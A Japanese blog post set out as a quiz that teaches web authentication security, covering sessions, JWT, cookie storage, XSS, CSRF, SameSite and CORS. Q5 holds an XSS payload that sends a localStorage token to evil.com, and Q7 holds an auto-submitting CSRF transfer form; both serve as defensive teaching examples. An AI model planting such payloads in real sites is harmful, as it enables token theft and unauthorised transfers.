## はじめに

某SNSで認証の管理についての話題が大変盛り上がっていました。
お恥ずかしながら、認証データの保存は localstorage より Cookie が優れていると漠然と思っていましたので、いろいろな意見があって大変勉強になりました。

認証周りの脅威はwebアプリ作るうえで避けては通れない部分だとは思いますが、
一度作られると手を入れることが無かったり、フレームワークに組み込まれていることも多いので、
実は仕組みを理解せずに使っている人も多い気がします。

お勉強がてら基本情報くらいの内容をベースにクイズ形式でまとめていました。
ぜひ回答しながら読んでみてください

## Q0 ログインした後サーバーはどうやって同じユーザーだと判断している？

> あなたは https://hogehoge.com にID・パスワードでログインしました。
> その後、タイムラインを開いたり、投稿したり、サイト上で操作を行います。
> 
> ブラウザとサーバーの通信に使われる HTTP はリクエストのたびに初対面です。
> ログインをする時、タイムラインを開く時、投稿するとき、それぞれ独立したリクエストが発生します。
> サーバーは前のリクエストのことを覚えていません。
> 
> あなたがログインしたユーザーであることはどのように判断しているのでしょうか？

:::details ガパオライスの回答
サーバがIDとパスワードを認証した後に何らかのトークンを発行し、その情報をブラウザに返します。
そのトークンをヘッダーやcookieなどを用いてブラウザから毎リクエスト送ることで、サーバは認証済みのユーザーであることを判定します。
:::

:::message
**解説**

HTTP はステートレスプロトコルです。
各リクエストは完全に独立しており、サーバーは「前回のリクエストを送ってきたのと同じ人か」を HTTP 自体の仕組みで判断できません。

この問題を解決するのが **セッション管理** の概念です。
ログイン成功時にサーバーはセッション ID や JWT などの「証明書」を発行してブラウザに渡します。
ブラウザはその後のリクエストごとにその証明書を送り続けることで、サーバーは「誰が操作しているか」を識別できます。
:::

## Q1 「証明書」はどこに保存される？

> Q1の答えとして「サーバーが何らかの証明書をブラウザに渡している」ことが分かりました。
> その証明書で一般的なものにセッションIDがあります。
> 
> セッションIDを使った認証の仕組みでは例えば以下のようなことを行います。
> ログインが成功した時、サーバーが `Set-Cookie: session_id=abc123` を含むレスポンスを返したとします。
>
> この時、ブラウザ側・サーバー側それぞれ「どこに」「何を」保存していると考えられますか？

:::details ガパオライスの回答
ブラウザ cookie に session_id=abc123 の cookie が保存されます
サーバ DBのsessionテーブルやサーバ上のメモリなどの何らかの方法で session_idに紐づくセッション情報が保存されます
:::

:::message
**解説**

セッションIDを使った認証の仕組みは最も一般的でよく使われる認証方法です。
このようにセッションIDを使った認証をセッション認証（セッションベース認証）といいます。

セッション認証では、ブラウザとサーバーが情報を分担して保持します。

| 保存場所 | 保存する内容 |
| --- | --- |
| ブラウザ（Cookie） | `session_id=abc123` というキーの値のみ |
| サーバー（DB / Redis 等） | セッション ID に紐づくユーザー ID・権限・有効期限などのセッション情報 |

リクエストが来るたびにサーバーはセッション ID をストアに検索し、対応するセッション情報からユーザーを特定します。
ブラウザ側には「証明書の番号」だけ渡し、実際の中身はサーバーが管理するというモデルです。

<!-- なお、ブラウザ側の保存先は Cookie だけではありません。
JWT などのトークンを JavaScript の変数として **メモリ（インメモリ）** に持つ実装もあります。
メモリに保存した場合は LocalStorage や Cookie に書き出さないため XSS での窃取リスクが下がる一方、ページリロードやタブを閉じると消えてしまうため UX との兼ね合いで使われます。
この場合、リフレッシュトークンだけを HttpOnly Cookie に保存し、アクセストークンはメモリで管理するという構成がよく採用されます。 -->
:::

## Q2 セッションIDが漏れると何が起きる？

> 田中さんのブラウザには session_id=abc123 が保存されています。
> 何らかの方法で攻撃者がこの値を手に入れました。
> 
> 攻撃者はセッションIDを使って何ができるでしょうか？
> また、サーバー側はその操作が「田中さん本人」と「攻撃者のなりすまし」を区別できるでしょうか？

:::details ガパオライスの回答
認可が必要なAPIを session_id=abc123 を使って実行することで、田中さんがその操作を行ったかのような「なりすまし」が可能です
無対策の場合、サーバ側は田中さんと攻撃者を区別できません
:::

:::message
**解説**

セッション ID は「本人であることの証明書」です。
そのため入手した攻撃者は `session_id=abc123` をセットしてリクエストを送るだけで、本人になりすますことができます。
これを **セッションハイジャック** といいます。

サーバーはセッション ID の正当性しか確認しないため、同じ ID を持つリクエストが本人か攻撃者かを区別できません。

主な対策は以下のとおりです。

- セッション ID を十分に長くランダムに生成する
- HTTPS を必須にして通信経路での盗聴を防ぐ
- ログイン後にセッション ID を再生成する（セッション固定攻撃の防止）
- 一定時間操作がなければセッションを無効化する

:::

## Q3 JWTはSessionの上位互換？

> セッションの課題として「サーバー側でセッション情報を保持し続けなければならない」ことが挙げられます。
> サーバーが複数台に増えると、セッション情報の共有が必要になり管理が複雑になります。
> そこで登場するのが JWT（JSON Web Token） です。
> JWTは . で区切られた3つのパーツからなる文字列です。
> 
> ```
> eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEyM30.SbUCQUTOqPUo_ky20e1j9p1JZQN-bHyOhS67Rq2wbU
> ```
>
> JWTはなぜサーバー側にセッション情報を保持しなくていいのでしょうか？
> また、セッションと比べて失うものは何でしょうか？（トレードオフを答えてください）

:::details ガパオライスの回答
JWTには、

- ユーザーを一意に識別するIDなどの情報
- 有効期限

等のjson情報と署名が含まれています

署名が含まれることで改ざんが検知できるので、ユーザーIDや有効期限を改ざんしたJWTを検知することができます。
「正常なJWTを持っている=認証に成功したユーザーである」ことが確認できるので、サーバで有効なセッションを保持しなくてもよい。
署名の検証のみで正常なJWTであることを確認できるので、セッションをDBやメモリ内に探しに行かなくても良いのもメリット。

ただし、現在有効なトークンの一覧をサーバ側で保持していないので、サーバ側からトークンを無効化するといった操作はできない
例えば、ログアウトを行いブラウザからJWTが削除されても、JWTを無効化することができないのでJWT内で持つ期限が失効するまで有効なトークンとして働いてしまう
:::

:::message
**解説**

JWT は `.` で区切られた **ヘッダー・ペイロード・署名** の 3 パーツ構成です。ペイロードにユーザー ID や有効期限を含み、署名によって改ざんを検知できます。

```
eyJhbGciOiJIUzI1NiJ9       ← ヘッダー（アルゴリズム情報）
.eyJ1c2VySWQiOjEyM30       ← ペイロード（ユーザー情報・有効期限）
.SbUCQUTOq...               ← 署名（改ざん検知用）
```

サーバーは署名を検証するだけでよく、セッション情報を DB やメモリに保存・検索する必要がないため、**複数台のサーバーにスケールアウトしやすい**のが大きなメリットです。

一方でトレードオフもあります。有効なトークンの一覧をサーバーが持たないため、**特定の JWT を即時無効化する手段がありません**。ログアウトしてもブラウザから Cookie を削除するだけで JWT 自体は有効期限まで生き続けます。この問題は短命なアクセストークンとリフレッシュトークンを組み合わせることで緩和できますが、セッション方式に比べて複雑になります。
:::

- リフレッシュトークンとアクセストークン
- Blacklistで無効化したトークンを除外→セッションでいいのでは

## Q4 認証データをブラウザに保存するならどこ？

> Q4でSessionIDもJWTも、どちらも「ブラウザ側に何らかの認証データを保存する」ことが分かりました。
> 
> LocalStorage（JavaScriptから localStorage.getItem() で読み書きできる）
> Cookie（サーバーから Set-Cookie で発行される）
> 
> セキュリティの観点から、認証データの保存場所としてどちらが望ましいでしょうか？
> またその理由を、LocalStorageの弱点に触れながら説明してください。

:::details ガパオライスの回答
Cookieがいいと思う

Cookieは http only を設定することでjsから読み書きができなくなる
LocalStorage はjs側で読み書きができる

Cookieはサーバに自動で送付されるという点で攻撃の対象になることもあるが
samesiteを設定することで同じoriginにのみ送付するように設定したり、secureを設定することでhttpsでのみ送付したりする設定が可能
:::

:::message
**解説**

認証データの保存先として **HttpOnly 属性付き Cookie** が推奨されます。

| 保存場所 | JavaScript からの読み取り | XSS での窃取リスク |
| --- | --- | --- |
| LocalStorage | 可能（`localStorage.getItem()`） | 高い |
| Cookie（HttpOnly なし） | 可能（`document.cookie`） | 高い |
| Cookie（HttpOnly あり） | 不可 | 低い |

LocalStorage は JavaScript から自由に読み書きできるため、データをまるごと盗まれるリスクがあります。
`HttpOnly` を付けた Cookie は `document.cookie` からも読めないため、JavaScript による窃取を防げます。

<!-- Cookie にはさらに以下の属性を組み合わせることで堅牢になります。

- `Secure` — HTTPS 通信時のみ送信
- `SameSite=Lax` — クロスサイトリクエスト時の Cookie 送信を制限 -->
:::

## Q5 XSSが発生すると認証データは盗める？

> 掲示板サービスに、悪意のあるユーザーが次の文字列を投稿しました。
> 
> ```
> こんにちは！<script>fetch('https://evil.com?token='+localStorage.getItem('token'))</script>
> ```
> 
> サービスがこの投稿をHTMLとして表示しました。
> この投稿を見たユーザーに何が起きるでしょうか？
> この攻撃の名前と、なぜ成立するかを説明してください。

:::details ガパオライスの回答
ローカルストレージに保存されている掲示板サービスの認証トークンが、攻撃者のサーバに送信されます。
このような攻撃はXSS（クロスサイトスクリプティング）といいます。
:::

:::message
**解説**

**XSS（クロスサイトスクリプティング）** は、Web アプリがユーザー入力を適切にエスケープせずに HTML として出力してしまう脆弱性です。
攻撃者が仕込んだ `<script>` タグがブラウザ上でそのまま実行されます。

XSS が発生した場合、**トークンの保存場所に関わらず** DOM の内容・フォームの入力値・表示されている個人情報など、JavaScript からアクセスできるものはすべて盗まれる可能性があります。
そのため **XSS 対策はどこにトークンを保存するかに関係なく必須です。**

その上で、保存場所による差が出るのは **トークンが外部に持ち出せるかどうか** です。

| 保存場所 | XSS でトークンを外部に送れるか | 被害の広がり方 |
| --- | --- | --- |
| LocalStorage | できる（`getItem()` で取得して送信） | 攻撃者が被害者のブラウザ外から永続的に悪用できる |
| HttpOnly Cookie | できない（JS から読めない） | 被害が被害者のブラウザ内の操作に限定される |

LocalStorage にトークンを保存していると、XSS 一発でトークンを攻撃者のサーバーに送り出せてしまい、その後は被害者のブラウザとは無関係に悪用されます。

HttpOnly Cookie であれば JS からトークンの値を読めないため外部への持ち出しができず、XSS を使って被害者のブラウザ上でリクエストを動かすことしかできません。
Cookie に入れるのは「XSS を防ぐ」ためではなく「XSS が起きたときの被害範囲を狭める」ためです。

<!-- 主な XSS 対策は以下のとおりです。

- ユーザー入力を HTML に出力する際は必ずエスケープ処理（サニタイズ）を行う
- CSP（Content Security Policy）ヘッダーを設定してインラインスクリプトの実行を制限する -->
:::

## Q6 HttpOnly Cookieにしたら完全防御？

> Q6の反省から、認証データを HttpOnly属性付きのCookie に保存することにしました。
> HttpOnly を付けると、JavaScriptから document.cookie でCookieを読むことができなくなります。
> 
> ```
> Set-Cookie: token=xxx; HttpOnly; Secure
> ```
> 
> HttpOnly CookieにすることでXSSから認証データを守れます。
> では、これで認証データを狙うすべての攻撃を防げるでしょうか？
> 防げない攻撃があるとすれば、それはどんな攻撃でしょうか？

:::details ガパオライスの回答
cookieはサーバにリクエストを送付するとき、cookieを自動で付与する機能があります。
それを悪用して、悪意あるサイトから本物のサーバへのリクエストを行う設定を行うことで、本物のサイトでログイン済みのユーザーが意図しない操作を実行することができます。
CSRF（クロスサイトリクエストフォージェリ）です。
:::

:::message
**解説**

HttpOnly Cookie は JavaScript による Cookie の **読み取り** を防ぎますが、ブラウザがリクエスト時に Cookie を **自動送信する** という動作は変わりません。

**CSRF（クロスサイトリクエストフォージェリ）** はこの「自動送信」を悪用します。
攻撃者は Cookie の値を知らなくても、被害者のブラウザに別サイトから本物のサーバーへリクエストを送らせることができます。
Cookie はブラウザが自動で付与するため、サーバーには正規ユーザーからのリクエストに見えてしまいます。

つまり **HttpOnly Cookie は XSS 対策にはなりますが、CSRF 対策にはなりません**。これらは別々の脅威を防ぐものです。
:::

## Q7 CSRFとは？

> 田中さんはネットバンクにログイン中です。Cookieには HttpOnly が付いています。
> そこに怪しいメールが届き、リンクを踏んでしまいました。
> 遷移先のページには次のコードが仕込まれていました。
> 
> ```html
> <form action="https://bank.example.com/transfer" method="POST" id="f">
>   <input name="to" value="attacker">
>   <input name="amount" value="100000">
> </form>
> <script>document.getElementById('f').submit()</script>
> ```
>
> このページを開いた瞬間、田中さんのブラウザで何が起きるでしょうか？
> なぜ HttpOnly が付いていても防げないのかを含めて説明してください。

:::details ガパオライスの回答
attacker（攻撃者）に対して送金操作が行われます。
`https://bank.example.com` へのリクエストに自動でcookieを付与してしまい、田中さんとしてログインされた状態で操作が行われます。
:::

:::message
**解説**

ページを開いた瞬間、JavaScript がフォームを自動送信します。
このリクエストは本物の銀行サーバー `https://bank.example.com` 宛なので、ブラウザは田中さんのネットバンクのログイン Cookie を自動で付与します。
銀行サーバーには「田中さんが送金を指示した」ように見えるため、送金が実行されます。

`HttpOnly` はあくまで Cookie の **読み取り** を防ぐものです。
攻撃者は Cookie の値を一切知らなくてよく、ブラウザの自動送信という仕組みを利用しているためこの攻撃が成立します。
:::

## Q8 SameSite=Laxで何が防げる？

> CSRF対策の一つとして、Cookieの SameSite 属性があります。
> 
> ```
> Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Lax
> ```
> 
> SameSiteには Strict / Lax / None の3種類があります。
> 
> SameSite=Lax を設定した場合、Q8の攻撃（別サイトからのPOSTフォーム送信）は防げるでしょうか？
> また Strict にしなかった理由として考えられるUX上のトレードオフは何でしょうか？

:::details ガパオライスの回答
SameSite=Lax にした場合、別サイトへのPOSTでcookieを送信しない
SameSite=Strictは、GETでもcookieを送信しない気がする
:::

:::message
**解説**

`SameSite` 属性は、クロスサイトリクエスト時に Cookie を送信するかどうかを制御します。

| 属性値 | 別サイトからの GET（リンク遷移） | 別サイトからの POST・fetch |
| --- | --- | --- |
| `None` | 送信する | 送信する |
| `Lax` | 送信する | **送信しない** |
| `Strict` | **送信しない** | **送信しない** |

`Lax` の場合、POST フォーム送信やスクリプトからのリクエストにはクロスサイトで Cookie が付かないため、Q7 の攻撃は防げます。

一方 `Strict` にすると、外部サイトのリンクから遷移した際も Cookie が送られません。たとえばメールや別サービスのリンクからネットバンクに飛んできた場合、ログイン済みでも未ログイン状態として扱われ、再ログインが必要になるケースがあります。`Lax` はこの UX の問題を考慮した現実的なバランスの設定です。

CSRF の主な対策は以下のとおりです。

- **CSRF トークン** — サーバーが発行したランダムな値をフォームに埋め込み、サーバー側で検証する
- **SameSite 属性** — クロスサイトリクエスト時の Cookie 送信を制限する（次問で詳しく解説）
- **カスタムリクエストヘッダー** — `fetch` での API 呼び出しにカスタムヘッダーを付与し、ブラウザが自動送信できない形式にする

:::

## Q9 CORSは何を防いでいる？

> フロントエンド（https://myapp.com）からバックエンドAPI（https://api.myapp.com）にfetchでリクエストを送ったところ、ブラウザのコンソールに次のエラーが出ました。
> 
> ```
> Access to fetch at 'https://api.myapp.com/user' from origin 'https://myapp.com' 
> has been blocked by CORS policy
> ```
> 
> このエラーはなぜ起きているのでしょうか？
> このエラーを解消するためにどちらが設定を変える必要があるかを答えてください。

:::details ガパオライスの回答
今回の例ではフロントとサーバでサブドメインに違いがあり、異なるオリジン間の通信となっている。
サーバで設定されている CORS（クロスオリジンリソース...） で、許可されていないクロスオリジンからの通信がブロックされた。

サーバで https://myapp.com からの通信を許可する設定にする必要がある
:::

:::message
**解説**

ブラウザには **同一オリジンポリシー（SOP: Same-Origin Policy）** というセキュリティ制約があります。スキーム・ホスト・ポートのいずれかが異なると「別オリジン」と判断され、JavaScript からのリクエストはデフォルトでブロックされます。

今回は `myapp.com` と `api.myapp.com` でサブドメインが異なるため別オリジン扱いです。

**CORS（Cross-Origin Resource Sharing）** は、サーバーがレスポンスヘッダーで「このオリジンからのアクセスを許可する」と宣言することで、ブラウザが SOP の制約を緩和する仕組みです。

```http
Access-Control-Allow-Origin: https://myapp.com
```

設定変更が必要なのは **サーバー側** です。フロントエンド側でいくら設定しても、ブラウザはサーバーのレスポンスヘッダーを見て判断するため、サーバーの許可がなければ通信は成立しません。なお CORS はあくまでブラウザの制約であり、curl などのツールから直接 API を叩く場合はブロックされません。
:::

## Q10 この構成は安全？

> あなたはWebアプリを以下の構成でリリースしようとしています。
> 
> ```
> SPA（シングルページアプリケーション）
> 認証：JWT
> JWTの保存場所：HttpOnly Cookie
> Cookie属性：SameSite=Lax, Secure
> CORS：api.myapp.com が myapp.com のみ許可
> ```
> 
> この構成における残っているリスク・注意点を思いつく限り挙げてください。
> 「完璧な構成はない」前提で考えてみましょう。

:::details ガパオライスの回答
- 認証がJWTのみなのでトークンが漏洩した場合に対象のJWTが失効するまで無効化する手段がない
- CSRFトークンを使うことでもっと堅牢になる気がするけどどの辺が堅牢になるのか自信ない
- SSRではなくSPAであることで発生する問題がありそうだけど正直分かりません
:::

:::message
**解説**

セキュリティに完璧な構成はありません。この構成でも以下のようなリスクや注意点が残ります。

**JWT の即時無効化が困難**
サーバーが有効なトークン一覧を持たないため、トークンが漏洩しても JWT 自体の有効期限が切れるまで無効化できません。短命なアクセストークン（例: 15 分）と長命なリフレッシュトークンを組み合わせることで被害範囲を狭められます。

**XSS への別の経路**
HttpOnly Cookie によって認証データの窃取は防げますが、XSS が発生した場合は Cookie を盗まずとも JavaScript で意図しない操作（API 呼び出しなど）を実行できます。CSP（Content Security Policy）の設定でスクリプト実行を制限することが重要です。

**JWT ペイロードは平文**
ペイロードは Base64URL エンコードされているだけで、誰でも読めます（改ざんは署名で検知できますが、中身は見える）。パスワードや機密情報をペイロードに含めてはいけません。

**SameSite=Lax でも防げない CSRF のケース**
GET リクエストに副作用（データ変更）がある実装の場合、Lax では防げません。副作用のある操作は必ず POST/PUT/DELETE にし、必要に応じて CSRF トークンを追加することが推奨されます。

**ログアウトの信頼性**
JWT は有効期限まで有効であり続けます。「ログアウト = Cookie 削除」だけでは不十分な場面（強制ログアウト、アカウント停止など）には、ブラックリスト管理やリフレッシュトークンの失効管理が必要になります。
:::
